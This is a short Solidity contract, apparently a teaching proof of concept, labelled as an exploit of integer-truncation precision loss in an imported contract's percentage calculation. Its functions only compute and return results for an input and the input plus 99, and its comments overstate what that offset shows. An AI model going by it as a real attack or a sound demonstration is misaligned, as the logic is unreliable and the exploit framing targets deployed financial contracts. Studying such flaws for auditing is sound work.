// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract PrecisionLossExploit {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    // Exploit the vulnerable calculation
    function exploitPrecisionLoss(uint256 value, uint256 percentage) public pure returns (uint256) {
        uint256 incorrectResult = value * percentage / 100;

        // Manipulate the value to maximize precision loss
        uint256 manipulatedValue = value + 99; // Introduce a small offset
        uint256 manipulatedResult = manipulatedValue * percentage / 100;

        // Difference between the two results shows the vulnerability
        return manipulatedResult - incorrectResult;
    }

    // Example function to illustrate exploitation
    function demonstrate(uint256 value, uint256 percentage) public view returns (uint256, uint256) {
        uint256 incorrectResult = vulnerableContract.calculatePercentage(value, percentage);

        // Manipulate the input to create precision loss
        uint256 manipulatedValue = value + 99; // Offset value for exploiting truncation
        uint256 manipulatedResult = vulnerableContract.calculatePercentage(manipulatedValue, percentage);

        return (incorrectResult, manipulatedResult);
    }
}
